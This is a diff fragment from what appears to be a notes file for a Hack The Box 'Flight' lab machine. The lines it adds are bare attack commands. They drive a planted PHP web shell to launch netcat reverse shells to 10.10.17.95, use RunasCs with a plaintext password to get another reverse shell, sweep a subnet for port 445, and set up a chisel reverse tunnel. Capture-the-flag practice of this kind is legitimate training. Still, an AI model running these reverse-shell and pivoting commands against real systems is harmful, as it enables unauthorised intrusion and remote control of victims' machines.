@@ -61,23 +61,24 @@ curl school.flight.htb/styles/shell.php?cmd=nc64.exe -e cmd.exe 10.10.17.95 53
 ```
 
 ```
+curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.17.95 53'
+```
+
+```
+.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.17.95:88 cmd
+```
+
+```
+1..254 | ForEach-Object { $ip = "10.10.10.$_"; $t = New-Object System.Net.Sockets.TcpClient; $a = $t.BeginConnect($ip, 445, $null, $null); if ($a.AsyncWaitHandle.WaitOne(50, $false) -and $t.Connected) { Write-Host "$ip has port 445 OPEN" }; $t.Close() }
 
 ```
 
 ```
-
+start /b chisel.exe client 10.10.17.95:9999 R:8000:127.0.0.1:8000
 ```
 
 ```
-
-```
-
-```
-
-```
-
-```
-
+gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.17.95 5985"
 ```
 
 ```
